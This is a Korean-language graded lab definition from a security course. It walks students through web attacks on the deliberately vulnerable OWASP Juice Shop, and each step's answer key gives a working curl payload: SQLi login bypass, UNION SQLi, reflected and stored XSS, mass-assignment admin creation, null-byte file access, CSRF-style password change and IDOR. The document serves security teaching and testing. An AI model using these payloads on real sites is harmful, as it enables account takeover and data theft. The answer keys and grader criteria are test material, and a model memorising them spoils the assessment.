lab_id: attack-nonai-week04
title: 웹 애플리케이션 공격 (Web App Attacks)
version: non-ai
course: attack-nonai
week: 4
description: SQL Injection, XSS, Command Injection 등 주요 웹 공격 기법을 JuiceShop 환경에서 실습한다.
  OWASP Top 10 취약점을 직접 공략하고, 공격 원리와 대응 방안을 학습한다.
difficulty: medium
duration_minutes: 120
objectives:
- SQL Injection의 원리를 이해하고 다양한 기법(Union, Blind, Error-based)을 실습한다
- XSS(Reflected, Stored, DOM-based)를 실행하고 위험성을 파악한다
- 웹 공격의 대응 방안(입력 검증, WAF, CSP)을 이해한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop 로그인 페이지(/rest/user/login)에 SQL Injection을 시도하라. email에 '
    OR 1=1-- 페이로드를 사용하여 관리자로 로그인하라.
  hint: POST 요청의 email 필드에 SQL Injection 페이로드를 넣는다
  category: exploit
  points: 10
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\n | python3 -m json.tool"
  answer_detail: ''' OR 1=1-- 페이로드는 SQL WHERE 절을 항상 참으로 만들어 인증을 우회한다. --는 SQL 주석으로
    이후 조건을 무시시킨다. DB의 첫 번째 사용자(보통 admin)로 로그인된다.'
  verify:
    type: output_contains
    expect: token
    field: stdout
    semantic:
      intent: SQLi 로그인 우회 — curl -X POST /rest/user/login + email=' OR 1=1-- + password=a.
        WHERE 절 항상 참 + 주석으로 뒷부분 무효화 → 첫 사용자(admin) 로그인. OWASP A03 Injection + CWE-89.
      success_criteria:
      - token 키워드 (JWT 반환)
      - email='OR 1=1-- 페이로드
      - POST /rest/user/login
      acceptable_methods:
      - curl + OR 1=1--
      - sqlmap -u /login --data --dbms sqlite
      - Burp Repeater SQL 페이로드
      negative_signs:
      - OR 1=1 페이로드 없음
      - 주석(--) 없음
      - 인증 우회 목적 없음
  target_vm: attacker
- order: 2
  instruction: 획득한 JWT 토큰을 디코딩하여 관리자 계정의 이메일과 역할을 확인하라.
  hint: JWT는 Base64로 인코딩된 3부분으로 구성된다. python3으로 디코딩할 수 있다
  category: analysis
  points: 10
  answer: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"' OR 1=1--\",\"password\":\"a\"}' \\\
    \n | python3 -c \"import sys,json,base64; t=json.load(sys.stdin)['authentication']['token'];\
    \ p=t.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p)))\""
  answer_detail: JWT(JSON Web Token)는 header.payload.signature 구조이다. payload를 Base64
    디코딩하면 사용자 ID, 이메일, 역할(role) 등의 클레임을 확인할 수 있다. 서명 키가 없으면 변조는 불가능하다.
  verify:
    type: output_contains
    expect: email
    field: stdout
    semantic:
      intent: JWT 토큰 디코딩 — python3 + base64.urlsafe_b64decode(token.split('.')[1]
        + padding). JWT = header.payload.signature + payload 클레임 (id/email/role) 추출.
        서명 키 없이 읽기만 가능.
      success_criteria:
      - email 키워드 (디코딩된 클레임)
      - JWT split '.' + base64 디코딩
      - payload 추출
      acceptable_methods:
      - python base64 디코딩
      - jwt.io 웹
      - jq + base64 -d
      - PyJWT decode
      negative_signs:
      - base64 디코딩 없음
      - JWT 구조 (header.payload.signature) 맥락 없음
      - payload 추출 없음
  target_vm: attacker
- order: 3
  instruction: JuiceShop의 검색 기능(/rest/products/search?q=)에 XSS 페이로드를 삽입하라. <iframe
    src='javascript:alert(1)'> 페이로드를 사용하라.
  hint: 검색 쿼리에 HTML/JavaScript 코드를 삽입한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>'''
  answer_detail: Reflected XSS는 사용자 입력이 서버 응답에 그대로 반영될 때 발생한다. 공격자는 악성 스크립트가 포함된 URL을
    피해자에게 전달하여 세션 탈취, 피싱 등을 수행할 수 있다.
  verify:
    type: output_contains
    expect: iframe
    field: stdout
    semantic:
      intent: 'Reflected XSS — curl ''/rest/products/search?q=<iframe%20src%3D%22javascript:alert(1)%22>''.
        URL 인코딩 iframe + javascript: URI 스킴. 사용자 입력 반영 → 스크립트 실행. OWASP A03 + CWE-79.
        세션 탈취/피싱 기반.'
      success_criteria:
      - iframe 키워드
      - URL 인코딩 XSS 페이로드 + search?q=
      - 'javascript: URI'
      acceptable_methods:
      - curl + URL 인코딩 XSS
      - XSSer/DalFox
      - Burp Intruder XSS 리스트
      negative_signs:
      - iframe/script 페이로드 없음
      - URL 인코딩 없음
      - CWE-79 맥락 없음
  target_vm: attacker
- order: 4
  instruction: JuiceShop의 사용자 등록 API(/api/Users)를 사용하여 role을 admin으로 설정한 사용자를 등록하라.
    Mass Assignment 취약점을 공략하라.
  hint: 등록 요청에 role 필드를 추가하여 전송하라
  category: exploit
  points: 10
  answer: "\U0001F5A5️ UI: 브라우저에서 http://WEB_IP:3000 접속\n\U0001F4CE 참고 (CLI): curl\
    \ -s -X POST http://10.20.30.80:3000/api/Users \\\n  -H 'Content-Type: application/json'\
    \ \\\n  -d '{\"email\":\"hacker@test.com\",\"password\":\"hacker123\",\"passwordRepeat\"\
    :\"hacker123\",\"role\":\"admin\",\"securityQuestion\":{\"id\":1,\"question\"\
    :\"test\"},\"securityAnswer\":\"test\"}' \\\n | python3 -m json.tool"
  answer_detail: Mass Assignment는 서버가 클라이언트 입력을 검증 없이 객체에 바인딩할 때 발생한다. role 필드를 직접
    지정하여 관리자 권한의 계정을 생성할 수 있다. OWASP A01(Broken Access Control)에 해당한다.
  verify:
    type: output_contains
    expect:
    - email
    - admin
    field: stdout
    semantic:
      intent: Mass Assignment — curl -X POST /api/Users + role:admin 포함 JSON 등록. 서버
        객체 바인딩 미검증 → role 필드 직접 지정 → 관리자 계정 생성. OWASP A01 Broken Access Control +
        CWE-915.
      success_criteria:
      - email 키워드 (등록 성공)
      - role:admin 필드 포함 POST
      - /api/Users 등록
      acceptable_methods:
      - curl + role 필드 추가
      - Burp Repeater + 필드 주입
      - Postman + JSON 조작
      negative_signs:
      - role:admin 필드 없음
      - Mass Assignment 맥락 없음
      - OWASP A01 맥락 없음
  target_vm: attacker
- order: 5
  instruction: JuiceShop의 /rest/products/search?q= 엔드포인트에 UNION 기반 SQL Injection을
    시도하여 데이터베이스 테이블 정보를 추출하라.
  hint: UNION SELECT와 sqlite_master를 활용하라
  category: exploit
  points: 15
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'''
  answer_detail: UNION 기반 SQLi는 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 함께 출력하는 기법이다.
    sqlite_master(SQLite) 또는 information_schema(MySQL)에서 테이블 구조를 조회할 수 있다.
  verify:
    type: output_contains
    expect: SELECT
    field: stdout
    semantic:
      intent: UNION SQLi — curl '/rest/products/search?q=test%27%29%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'.
        원래 쿼리 + UNION SELECT sqlite_master (SQLite 스키마 테이블) → 테이블 구조 추출. 9개 컬럼 매칭.
      success_criteria:
      - SELECT 키워드
      - UNION SELECT + sqlite_master
      - URL 인코딩 페이로드
      acceptable_methods:
      - curl + UNION SELECT
      - sqlmap --dbs -T sqlite_master
      - Burp + 컬럼 개수 fuzz
      negative_signs:
      - UNION SELECT 없음
      - sqlite_master 또는 information_schema 맥락 없음
  target_vm: attacker
- order: 6
  instruction: JuiceShop의 고객 피드백(/api/Feedbacks)에 Stored XSS 페이로드를 삽입하라. comment 필드에
    <script>alert('XSS')</script>를 포함하라.
  hint: POST 요청으로 피드백을 제출하며, 관리자 토큰이 필요할 수 있다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"<script>alert(1)</script>","rating":1}''
    | python3 -m json.tool'
  answer_detail: Stored XSS는 악성 스크립트가 서버에 저장되어 다른 사용자가 해당 페이지를 볼 때 실행된다. Reflected
    XSS보다 위험하며, 관리자 페이지에서 실행되면 관리자 세션을 탈취할 수 있다.
  verify:
    type: output_contains
    expect:
    - comment
    - XSS
    field: stdout
    semantic:
      intent: Stored XSS — 로그인 후 TOKEN 획득 + curl -X POST /api/Feedbacks + comment:'<script>alert(1)</script>'
        + rating:1. 서버 저장 → 다른 사용자(관리자) 조회 시 실행. 관리자 세션 탈취 가능. Reflected보다 위험.
      success_criteria:
      - comment 키워드 (저장 성공)
      - TOKEN=$(curl login ...) + POST /api/Feedbacks
      - <script> 페이로드
      acceptable_methods:
      - TOKEN 획득 후 POST
      - Burp Repeater + stored XSS
      - 자동화 Postman
      negative_signs:
      - TOKEN 획득 단계 없음
      - <script> 페이로드 없음
      - Stored vs Reflected 구분 맥락 없음
  target_vm: attacker
- order: 7
  instruction: JuiceShop의 /ftp 디렉토리에서 Null Byte Injection을 사용하여 접근이 제한된 파일을 다운로드하라.
    package.json.bak 파일을 시도하라.
  hint: URL에 %2500(이중 인코딩된 Null Byte)을 사용하라
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md'''
  answer_detail: Null Byte Injection(%00)은 파일 확장자 검증을 우회하는 기법이다. 서버가 .md 파일만 허용할 때
    filename.bak%00.md로 요청하면 확장자 검증은 .md로 통과하지만 실제로는 .bak 파일이 반환된다.
  verify:
    type: output_contains
    expect: name
    field: stdout
    semantic:
      intent: Null Byte Injection — curl '/ftp/package.json.bak%2500.md'. %2500 (이중
        인코딩 Null) → 서버가 .md 확장자로 통과시키지만 OS는 .bak로 처리. 확장자 검증 우회 (CWE-158).
      success_criteria:
      - name 키워드 (package.json 내용)
      - '%2500 (이중 인코딩 Null Byte)'
      - package.json.bak 접근
      acceptable_methods:
      - curl + %2500
      - Burp Repeater + Null Byte
      - wfuzz Null Byte fuzzer
      negative_signs:
      - '%2500/%00 없음'
      - Null Byte 맥락 없음
      - 확장자 우회 맥락 없음
  target_vm: attacker
- order: 8
  instruction: JuiceShop에서 0-star 리뷰를 제출하라. rating 값을 0으로 설정하여 입력 검증 우회를 시도하라.
  hint: API 직접 호출로 클라이언트 측 검증을 우회한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && curl -s -X POST http://10.20.30.80:3000/api/Feedbacks -H ''Content-Type: application/json''
    -H "Authorization: Bearer $TOKEN" -d ''{"comment":"Zero star","rating":0}'' |
    python3 -m json.tool'
  answer_detail: 클라이언트 측 입력 검증(HTML5 min/max, JavaScript validation)은 API를 직접 호출하면
    우회할 수 있다. 서버 측에서도 반드시 검증을 수행해야 한다.
  verify:
    type: output_contains
    expect: rating
    field: stdout
    semantic:
      intent: 클라이언트 검증 우회 — TOKEN 후 curl -X POST /api/Feedbacks + rating:0. HTML5
        min=1 우회. API 직접 호출 = 클라이언트 검증 무력. 서버 검증 필수.
      success_criteria:
      - rating 키워드 (0 저장 확인)
      - TOKEN + POST /api/Feedbacks
      - rating:0 페이로드
      acceptable_methods:
      - curl + rating:0
      - Postman + 직접 API
      - Burp Repeater
      negative_signs:
      - rating:0 없음
      - 클라이언트 검증 우회 맥락 없음
      - 서버 검증 필요성 맥락 없음
  target_vm: attacker
- order: 9
  instruction: JuiceShop의 /rest/user/change-password 엔드포인트에서 CSRF 취약점을 확인하라. GET 요청으로
    비밀번호를 변경할 수 있는지 테스트하라.
  hint: GET 파라미터로 current, new, repeat을 전달한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && curl -s ''http://10.20.30.80:3000/rest/user/change-password?current=a&new=newpass123&repeat=newpass123''
    -H "Authorization: Bearer $TOKEN" -H ''Cookie: token=''$TOKEN'
  answer_detail: GET 요청으로 비밀번호 변경이 가능하면 CSRF 공격에 매우 취약하다. 공격자가 악성 이미지 태그(<img src=.../change-password?...>)를
    삽입하면 피해자의 비밀번호가 자동으로 변경될 수 있다.
  verify:
    type: output_contains
    expect: password
    field: stdout
    semantic:
      intent: CSRF (GET 비밀번호 변경) — TOKEN + curl '/rest/user/change-password?current=a&new=newpass123&repeat=newpass123'
        + Cookie:token=$TOKEN. GET 요청으로 상태 변경 → <img src=...> 삽입 시 자동 실행. CWE-352.
      success_criteria:
      - password 키워드 (변경 성공)
      - GET + current/new/repeat 쿼리 파라미터
      - Cookie:token 전송
      acceptable_methods:
      - curl GET + 쿼리
      - CSRF PoC 페이지
      - Burp CSRF PoC generator
      negative_signs:
      - GET 방식 아님
      - CSRF 맥락 없음
      - CWE-352 맥락 없음
  target_vm: attacker
- order: 10
  instruction: JuiceShop의 /rest/basket/1 엔드포인트에 접근하여 다른 사용자의 장바구니 내용을 조회하라(IDOR 취약점).
  hint: 다른 사용자의 basket ID를 직접 지정하여 접근한다
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}''
    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && curl -s http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
    | python3 -m json.tool'
  answer_detail: IDOR(Insecure Direct Object Reference)는 사용자가 URL의 ID 값을 변경하여 다른 사용자의
    리소스에 접근하는 취약점이다. 서버가 요청자의 소유권을 확인하지 않으면 발생한다.
  verify:
    type: output_contains
    expect: Products
    field: stdout
    semantic:
      intent: IDOR 장바구니 — TOKEN + curl /rest/basket/2. URL 내 basket ID 직접 변경 → 다른
        사용자 리소스 접근. CWE-639 Authorization Bypass Through User-Controlled Key. OWASP
        A01.
      success_criteria:
      - Products 키워드 (다른 사용자 basket)
      - /rest/basket/2 (ID 변경)
      - TOKEN 포함 요청
      acceptable_methods:
      - curl + ID 변경
      - Burp Intruder IDOR fuzz
      - Autorize extension
      negative_signs:
      - ID 변경 없음
      - IDOR 맥락 없음
      - CWE-639 맥락 없음
